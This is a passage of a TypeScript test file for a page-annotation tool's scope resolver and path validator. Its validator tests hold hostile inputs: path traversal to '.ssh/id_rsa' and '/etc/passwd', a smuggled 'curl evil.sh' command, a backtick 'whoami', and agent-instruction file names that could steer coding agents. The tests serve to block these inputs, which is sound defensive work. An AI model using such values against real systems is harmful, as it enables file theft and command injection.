    expect(result.scope.siblings).toBeUndefined();
  });
});

describe('scope — caps and skips', () => {
  // The member cap announces itself and demotes; the exclusion cap did neither,
  // so a busy marquee published a 12-item list that looked like the whole set.
  // That is the same "the counts are a complete accounting" misreading the
  // N-of-M note closes from the other end.
  it('announces and demotes when the exclusion cap trips', () => {
    const grazed = Array.from({ length: 14 }, (_, i) => `<div id="g${i}"></div>`).join('');
    mount(`<div id="row"><div id="m"></div>${grazed}</div>`);
    rect(document.querySelector('#row')!, 0, 0, 1600, 200);
    // Fully covered, so this is a region with members rather than an insertion.
    rect(document.querySelector('#m')!, 0, 90, 100, 12);
    // 12% covered each — grazed, and there are more of them than the cap.
    for (let i = 0; i < 14; i++)
      rect(document.querySelector(`#g${i}`)!, 100 + i * 100, 0, 100, 100);
    const result = resolveScope(document.querySelector('#m') as Element, {
      left: 0,
      top: 90,
      width: 1600,
      height: 12,
    })!;
    expect(result.scope.members).toHaveLength(1);
    expect(result.scope.excluded).toHaveLength(12);
    expect(result.scope.truncated).toBe(true);
    expect(result.scope.confidence).toBe('low');
  });

  it('data-pinflow-ignore skips the whole subtree', () => {
    mount(
      '<div id="row"><div id="keep"></div><div id="skip" data-pinflow-ignore><i id="in"></i></div></div>',
    );
    const row = document.querySelector('#row') as HTMLElement;
    rect(row, 0, 0, 400, 100);
    rect(document.querySelector('#keep')!, 0, 0, 200, 100);
    rect(document.querySelector('#skip')!, 200, 0, 200, 100);
    rect(document.querySelector('#in')!, 200, 0, 200, 100);
    const result = resolveScope(row, { left: 0, top: 0, width: 400, height: 100 })!;
    const ids = result.elements.members.map((e) => (e as HTMLElement).id);
    expect(ids).toEqual(['keep']);
    expect(result.elements.excluded.map((e) => (e as HTMLElement).id)).not.toContain('skip');
  });

  it('caps the change set and demotes confidence when it trips', () => {
    const cells = Array.from({ length: 60 }, (_, i) => `<i id="n${i}"></i>`).join('');
    mount(`<div id="row">${cells}</div>`);
    const row = document.querySelector('#row') as HTMLElement;
    rect(row, 0, 0, 600, 100);
    for (let i = 0; i < 60; i++) rect(document.querySelector(`#n${i}`)!, i * 10, 0, 10, 100);
    const s = resolveScope(row, { left: 0, top: 0, width: 600, height: 100 })!.scope;
    expect(s.members!.length).toBeLessThanOrEqual(24);
    expect(s.confidence).toBe('low');
    expect(s.truncated).toBe(true);
  });

  it('skips tags that can never be a pin target', () => {
    mount('<div id="row"><script id="js"></script><div id="keep"></div></div>');
    const row = document.querySelector('#row') as HTMLElement;
    rect(row, 0, 0, 200, 100);
    rect(document.querySelector('#js')!, 0, 0, 200, 100);
    rect(document.querySelector('#keep')!, 0, 0, 200, 100);
    const result = resolveScope(row, { left: 0, top: 0, width: 200, height: 100 })!;
    expect(result.elements.members.map((e) => (e as HTMLElement).id)).toEqual(['keep']);
  });
});

describe('scope — derived field safety', () => {
  it('caps every derived label at capture', () => {
    const long = 'x'.repeat(500);
    mount(`<ul id="l"><li aria-label="${long}"><b>a</b></li><li aria-label="b"><b>b</b></li></ul>`);
    const l = document.querySelector('#l') as HTMLElement;
    rect(l, 0, 0, 200, 100);
    document.querySelectorAll('li').forEach((li, i) => rect(li, i * 100, 0, 100, 100));
    const s = resolveScope(l, { left: 0, top: 0, width: 200, height: 100 })!.scope;
    for (const m of s.members!) expect((m.label ?? '').length).toBeLessThanOrEqual(80);
  });

  it('strips invisible and bidi codepoints at capture, so the JSON twin is clean too', () => {
    const label = 'Bu\u200By\u202E now';
    mount(`<div id="row"><div id="a" aria-label="${label}"></div></div>`);
    const row = document.querySelector('#row') as HTMLElement;
    rect(row, 0, 0, 100, 100);
    rect(document.querySelector('#a')!, 0, 0, 100, 100);
    const s = resolveScope(row, { left: 0, top: 0, width: 100, height: 100 })!.scope;
    expect(s.members![0]!.label).toBe('Buy now');
  });
});

describe('validateSourcePath (R16) — drop, never repair', () => {
  it('accepts an ordinary component path', () => {
    expect(validateSourcePath('src/components/Pricing.tsx')).toBe('src/components/Pricing.tsx');
  });

  const bypasses: Array<[string, unknown]> = [
    ['the agent-instruction file the finding names', 'CLAUDE.md'],
    ['any agent config, case-insensitively', 'src/Agents.MD'],
    ['a sibling agent config', 'GEMINI.md'],
    ['copilot instructions', '.github/copilot-instructions.md'],
    ['parent traversal', '../../.ssh/id_rsa'],
    ['a dotfile', '.env'],
    ['a dot-directory', '.git/config'],
    ['a windows path', 'src\\app.tsx'],
    ['a UNC path', '\\\\host\\share\\a.tsx'],
    ['a scheme', 'file:///etc/passwd'],
    ['percent-encoded traversal', 'src/%2e%2e/%2e%2e/etc/passwd'],
    ['a fullwidth-dot traversal', 'src/\uFF0E\uFF0E/secrets.tsx'],
    ['an RTL override', 'src/\u202Exst.tsx'],
    ['a NUL byte', 'src/a\u0000.tsx'],
    ['a newline', 'src/a.tsx\ninjected'],
    ['a glob', 'src/**/*.tsx'],
    ['a leading dash that would parse as argv', '-rf.tsx'],
    ['a home expansion', '~/secrets.tsx'],
    ['a shell metacharacter', 'src/a.tsx;curl evil.sh'],
    ['a backtick', 'src/`whoami`.tsx'],
    ['a bare directory with no extension', 'src/components'],
    ['a markdown file', 'docs/readme.md'],
    ['a shell script', 'scripts/deploy.sh'],
    ['a lockfile-ish yaml', 'ci/config.yml'],
    ['json', 'package.json'],
    ['a trailing dot', 'src/app.'],
    ['an empty segment', 'src//app.tsx'],
    ['an absolute path', '/etc/passwd.tsx'],
    ['a non-string', 42],
    ['an empty string', ''],
  ];

  for (const [why, value] of bypasses) {
    it(`drops ${why}`, () => {
      expect(validateSourcePath(value)).toBeNull();
    });
  }

  it('drops rather than repairs — no partial output ever escapes', () => {
    for (const [, value] of bypasses) {
      const out = validateSourcePath(value);
      expect(out === null || out === value).toBe(true);
    }
  });

  it('refuses a hostile source attribute at capture, so no clause is emitted', () => {
    mount('<div data-pinflow-source="CLAUDE.md"><span id="s">x</span></div>');
    const s = document.querySelector('#s') as Element;
    rect(s, 0, 0, 10, 10);
    const result = resolveScope(s)!;
    expect(result.scope.source).toBeUndefined();
    expect(result.scope.rung).not.toBe('source');
  });
});

describe('demoteScope — a healed anchor must not keep a stale node list', () => {
  // A heal means the member set describes a DOM that no longer exists, so a
  // derived ancestor claim is exactly as invalid as the member list.
  it('drops the motion lead too, since it was derived from the same DOM', () => {
    const d = demoteScope({
      gen: SCOPE_GEN,
      rung: 'landmark',
      confidence: 'high',
      boundary: { tag: 'section', css: 'main > section' },
      motion: { tag: 'div', css: 'main > div.card', props: 'rotate' },
    });
    expect(d.motion).toBeUndefined();
    expect(d.stale).toBe(true);
  });

  it('drops members and exclusions, floors confidence, and marks itself stale', () => {
    const { cards } = grid();
    const s = resolveScope(cards[0]!, OVER_ALL_THREE)!.scope;
    const d = demoteScope(s);
    expect(d.members).toBeUndefined();
    expect(d.excluded).toBeUndefined();
    expect(d.confidence).toBe('low');
    expect(d.stale).toBe(true);
    // The boundary is the one thing a heal does not invalidate.
    expect(d.boundary).toEqual(s.boundary);
  });

  it('is idempotent', () => {
    const { cards } = grid();
    const s = resolveScope(cards[0]!, OVER_ALL_THREE)!.scope;
    expect(demoteScope(demoteScope(s))).toEqual(demoteScope(s));
  });

  it('does not mutate its input', () => {
    const { cards } = grid();
    const s = resolveScope(cards[0]!, OVER_ALL_THREE)!.scope;
    const before = JSON.stringify(s);
    demoteScope(s);
    expect(JSON.stringify(s)).toBe(before);
  });
});

describe('scope — the mangling invariant', () => {
  // esbuild mangles /^_/ on DOTTED access but not QUOTED access, mangles
  // per entry point, and never runs over the dts pass. A `_`-prefixed key on
  // anything persisted or exported is silent data corruption that CI cannot
  // catch — so the rule is enforced against the source itself.
  it('scope.ts contains no _-prefixed identifier', () => {
    const stripped = scopeSource
      .replace(/\/\*[\s\S]*?\*\//g, '')
      .replace(/(^|[^:])\/\/.*$/gm, '$1');
    const hits = stripped.match(/(?<![A-Za-z0-9$])_[A-Za-z0-9]/g) ?? [];
    expect(hits).toEqual([]);
  });

  it('emits no scope key that starts with an underscore', () => {
    const { cards } = grid();
    const s = resolveScope(cards[0]!, OVER_ALL_THREE)!.scope;
    const keys: string[] = [];
    const walk = (v: unknown): void => {
      if (Array.isArray(v)) v.forEach(walk);
      else if (v && typeof v === 'object')
        for (const [k, child] of Object.entries(v)) {
          keys.push(k);
          walk(child);
        }
    };
    walk(s);
    expect(keys.filter((k) => k.startsWith('_'))).toEqual([]);
  });
});

describe('scope — resolveScope contract', () => {
  it('returns null for a detached element rather than fabricating a boundary', () => {
    const orphan = document.createElement('div');
    expect(resolveScope(orphan)).toBeNull();
  });

  it('live element refs are returned for the outline and never stored on the record', () => {
    const { cards } = grid();
    const result = resolveScope(cards[0]!, OVER_ALL_THREE)!;
    expect(result.elements.members[0]).toBeInstanceOf(Element);
    expect(JSON.stringify(result.scope)).not.toContain('[object');
  });

  it('a point pin gets a STRICT ancestor as its ceiling', () => {
    // The climb starts at the parent, not the element: starting at the element
    // collapses ceiling and change into one whenever a rung matches the element
    // itself — which anchorTarget guarantees on every page using data-testid.
    mount('<div id="wrap"><span id="s">x</span></div>');
    const s = document.querySelector('#s') as Element;
    rect(s, 0, 0, 10, 10);
    const scope = resolveScope(s)!.scope;
    expect((scope.boundary.css ?? '').includes('wrap') || scope.boundary.tag === 'div').toBe(true);
    expect(scope.members).toHaveLength(1);
    expect(scope.members![0]!.tag).toBe('span');
  });

  it('omits members when there is no ancestor above the pinned element', () => {
    // Directly under <body>, so the climb has nowhere legal to go: the element
    // is its own boundary and there is nothing separate to name as a change.
    mount('<span id="s">x</span>');
    const s = document.querySelector('#s') as Element;
    rect(s, 0, 0, 10, 10);
    const scope = resolveScope(s)!.scope;
    expect(scope.boundary.tag).toBe('span');
    expect(scope.members).toBeUndefined();
  });

  it('a point pin inside a component names the element as the change and the component as the ceiling', () => {
    mount('<section data-testid="pricing"><button id="b">Go</button></section>');
    const b = document.querySelector('#b') as Element;
    rect(document.querySelector('section')!, 0, 0, 400, 200);
    rect(b, 10, 10, 100, 40);
    const scope = resolveScope(b)!.scope;
    expect(scope.boundary.testid).toBe('pricing');
    expect(scope.members).toHaveLength(1);
    expect(scope.members![0]!.tag).toBe('button');
  });
});

// Motion notes are 23% of real review notes across two sessions, and the
// element that animates is almost never the one the region covered: a marquee
// over a code block emits seventeen syntax spans while the rotate lives on the
// card wrapping them. `motion` names that element and WHICH properties move.
//
// happy-dom returns '' for every animation property, so a capture test that
// does not stub getComputedStyle is a guaranteed no-op that passes vacuously.
describe('scope — the element that actually animates', () => {
  function styles(map: Record<string, Partial<CSSStyleDeclaration>>): void {
    vi.stubGlobal('getComputedStyle', (el: Element) => {
      const key = (el as HTMLElement).id || el.tagName.toLowerCase();
      return {
        animationName: '',
        transitionProperty: '',
        transitionDuration: '0s',
        ...(map[key] ?? {}),
      } as CSSStyleDeclaration;
    });
  }
  afterEach(() => vi.unstubAllGlobals());

  const TILT = { transitionProperty: 'rotate', transitionDuration: '0.35s' };

  it('names an animating ANCESTOR of a text-level member set', () => {
    mount('<div id="card"><pre id="pre"><span id="a">x</span><span id="b">y</span></pre></div>');
    const card = document.querySelector('#card') as HTMLElement;
    rect(card, 0, 0, 400, 200);
    rect(document.querySelector('#pre')!, 0, 0, 400, 200);
    rect(document.querySelector('#a')!, 10, 10, 100, 20);
    rect(document.querySelector('#b')!, 10, 40, 100, 20);
    styles({ card: TILT });
    const r = resolveScope(document.querySelector('#a') as Element, {
      left: 5,
      top: 5,
      width: 380,
      height: 90,
    })!;
    expect(r.scope.motion?.tag).toBe('div');
    expect(r.scope.motion?.props).toBe('rotate');
  });

  it('falls back to the pinned element when there are no members', () => {
    mount('<section id="sec"><p id="p">x</p></section>');
    rect(document.querySelector('#sec')!, 0, 0, 400, 200);
    rect(document.querySelector('#p')!, 10, 10, 50, 20);
    styles({ sec: TILT });
    // Point pin: boundary is the section, member is the <p>.
    const r = resolveScope(document.querySelector('#p') as Element)!;
    expect(r.scope.motion?.props).toBe('rotate');
  });

  // The seed contract. In one real note the animator is a CHILD of members[0]
  // (`li.scene` inside `ul.scenes`), so an upward-only walk misses it entirely.
  it('finds an animator that is the first CHILD of the first member', () => {
    mount('<div id="wrap"><ul id="list"><li id="card1">a</li><li id="card2">b</li></ul></div>');
    rect(document.querySelector('#wrap')!, 0, 0, 400, 200);
    rect(document.querySelector('#list')!, 0, 0, 400, 200);
    rect(document.querySelector('#card1')!, 0, 0, 400, 100);
    rect(document.querySelector('#card2')!, 0, 100, 400, 100);
    styles({ card1: TILT });
    const r = resolveScope(document.querySelector('#list') as Element, {
      left: 0,
      top: 0,
      width: 400,
      height: 200,
    })!;
    expect(r.scope.motion?.props).toBe('rotate');
  });

  // A colour fade is not motion. "This button isn't landing" must stay silent.
  it('ignores a paint-only transition', () => {
    mount('<div id="card"><p id="p">x</p></div>');
    rect(document.querySelector('#card')!, 0, 0, 400, 200);
    rect(document.querySelector('#p')!, 10, 10, 100, 20);
    styles({
      card: {
        transitionProperty: 'background-color, border-color, color',
        transitionDuration: '0.18s',
      },
    });
    const r = resolveScope(document.querySelector('#p') as Element)!;
    expect(r.scope.motion).toBeUndefined();
  });

  it('ignores a movement property whose duration is zero (reduced motion)', () => {
    mount('<div id="card"><p id="p">x</p></div>');
    rect(document.querySelector('#card')!, 0, 0, 400, 200);
    rect(document.querySelector('#p')!, 10, 10, 100, 20);
    styles({ card: { transitionProperty: 'rotate', transitionDuration: '0s' } });
    expect(resolveScope(document.querySelector('#p') as Element)!.scope.motion).toBeUndefined();
  });

  it('names a keyframes animation, which is a literal source token', () => {
    mount('<div id="card"><p id="p">x</p></div>');
    rect(document.querySelector('#card')!, 0, 0, 400, 200);
    rect(document.querySelector('#p')!, 10, 10, 100, 20);
    styles({ card: { animationName: 'cta-settle' } });
    expect(resolveScope(document.querySelector('#p') as Element)!.scope.motion?.props).toBe(
      'cta-settle',
    );
  });

  it('never names pinflow’s own chrome, and never the document root', () => {
    mount('<div id="card" data-pinflow-root><p id="p">x</p></div>');
    rect(document.querySelector('#card')!, 0, 0, 400, 200);
    rect(document.querySelector('#p')!, 10, 10, 100, 20);
    styles({ card: TILT, body: TILT });
    const r = resolveScope(document.querySelector('#p') as Element);
    expect(r?.scope.motion).toBeUndefined();
  });
});
